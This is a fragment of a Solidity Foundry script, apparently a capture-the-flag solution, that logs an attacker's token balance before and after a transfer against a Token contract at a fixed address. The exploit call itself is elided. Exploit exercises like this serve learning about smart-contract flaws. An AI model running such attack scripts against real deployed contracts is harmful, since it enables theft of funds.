...
contract TokenAttackerScript is Script {
    Token public tokenContract =
        Token(0xB9f3b0D7D37e923faED24dFE4EC4f7e4B1ECd228);

    function run() public {
        vm.startBroadcast();
        console.log(
            "Token balance attacker before transfer: ",
        ...
        console.log(
            "Token balance of attacker after transfer: ",
            tokenContract.balanceOf(address(msg.sender))
        );
